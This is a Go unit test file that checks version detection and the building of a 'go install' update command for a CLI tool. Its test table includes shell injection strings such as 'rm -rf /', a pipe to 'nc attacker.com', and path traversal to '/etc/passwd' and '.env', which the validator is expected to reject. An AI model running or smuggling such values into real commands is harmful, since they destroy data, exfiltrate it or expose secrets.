package version

import (
	"strings"
	"testing"
)

func TestIsDevelopmentVersion(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		// Empty and unknown versions
		{"", true},
		{"unknown", true},
		{"dev", true},
		{"devel", true},

		// Development versions with build metadata
		{"devel+abc123", true},
		{"devel+abc+dirty", true},
		{"devel+git.sha.abc123def", true},
		{"devel+20240101", true},

		// Valid release versions (should be false)
		{"v0.1.0", false},
		{"0.1.0", false},
		{"1.0.0-beta", false},
		{"v1.0.0-alpha", false},
		{"v2.5.3", false},
		{"1.0.0-rc.1", false},

		// Edge cases - partial matches should not trigger dev
		{"develop", false},
		{"development", false},
		{"my-devel", false},
		{"devel", true},

		// Case sensitivity
		{"DEV", false},      // case-sensitive, so should be false
		{"DEVEL", false},
		{"Dev", false},

		// Versions that look semver-like but with dev prefix
		{"dev1.0.0", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := IsDevelopmentVersion(tt.input)
			if got != tt.expected {
				t.Errorf("IsDevelopmentVersion(%q) = %v, want %v", tt.input, got, tt.expected)
			}
		})
	}
}

func TestUpdateCommand(t *testing.T) {
	tests := []struct {
		version  string
		expected string
	}{
		// Valid standard versions
		{"v1.2.3", `go install -ldflags "-X main.Version=v1.2.3" github.com/marcus/td@v1.2.3`},
		{"1.2.3", `go install -ldflags "-X main.Version=1.2.3" github.com/marcus/td@1.2.3`},

		// Valid prerelease versions
		{"v0.3.0-beta", `go install -ldflags "-X main.Version=v0.3.0-beta" github.com/marcus/td@v0.3.0-beta`},
		{"v1.0.0-rc.1", `go install -ldflags "-X main.Version=v1.0.0-rc.1" github.com/marcus/td@v1.0.0-rc.1`},
		{"v0.1.0-alpha", `go install -ldflags "-X main.Version=v0.1.0-alpha" github.com/marcus/td@v0.1.0-alpha`},
		{"1.5.0-beta.2", `go install -ldflags "-X main.Version=1.5.0-beta.2" github.com/marcus/td@1.5.0-beta.2`},

		// Valid versions with complex prerelease identifiers
		{"v2.0.0-rc1.test", `go install -ldflags "-X main.Version=v2.0.0-rc1.test" github.com/marcus/td@v2.0.0-rc1.test`},

		// Invalid: empty string
		{"", ""},

		// Invalid: non-version strings
		{"invalid", ""},
		{"not-a-version", ""},
		{"hello", ""},

		// Invalid: shell injection attempts
		{`"; rm -rf /`, ""},
		{"v1.2.3; echo pwned", ""},
		{"v1.2.3$(whoami)", ""},
		{"v1.2.3`whoami`", ""},
		{"v1.2.3 && cat /etc/passwd", ""},
		{"v1.2.3 | nc attacker.com 1234", ""},

		// Invalid: path traversal attempts
		{"../../../etc/passwd", ""},
		{"../../.env", ""},

		// Invalid: prerelease identifier errors
		{"v1.2.3--", ""},         // double hyphen
		{"v1.2.3-", ""},          // trailing hyphen
		{"v1.2.3-beta-", ""},     // trailing hyphen in prerelease
		{"v1.2.3-.beta", ""},     // leading dot after hyphen
		{"v1.2.3-beta.", ""},     // trailing dot
		{"v1.2.3-beta..rc", ""},  // double dot
		{"v1.2.3-_invalid", ""},  // underscore in prerelease
		{"v1.2.3-beta_release", ""},

		// Invalid: missing version parts
		{"v1.2", ""},
		{"v1", ""},

		// Invalid: too many version parts
		{"v1.2.3.4", ""},

		// Invalid: non-numeric parts
		{"vA.B.C", ""},
		{"v1.a.3", ""},
	}

	for _, tt := range tests {
		t.Run(tt.version, func(t *testing.T) {
			got := UpdateCommand(tt.version)
			if got != tt.expected {
				t.Errorf("UpdateCommand(%q) = %q, want %q", tt.version, got, tt.expected)
			}
		})
	}
}

func TestUpdateCommandStructure(t *testing.T) {
	// Test that valid commands have the expected structure
	validVersions := []string{"v1.0.0", "1.2.3", "v0.1.0-beta"}

	for _, version := range validVersions {
		t.Run("structure_"+version, func(t *testing.T) {
			cmd := UpdateCommand(version)
			if cmd == "" {
				t.Errorf("UpdateCommand(%q) returned empty string for valid version", version)
			}

			// Check that command contains expected components
			if !strings.Contains(cmd, "go install") {
				t.Errorf("UpdateCommand result missing 'go install'")
			}
			if !strings.Contains(cmd, "-ldflags") {
				t.Errorf("UpdateCommand result missing '-ldflags'")
			}
			if !strings.Contains(cmd, "-X main.Version="+version) {
				t.Errorf("UpdateCommand result missing version flag")
			}
			if !strings.Contains(cmd, "github.com/marcus/td@"+version) {
				t.Errorf("UpdateCommand result missing package import with version")
			}
		})
	}
}
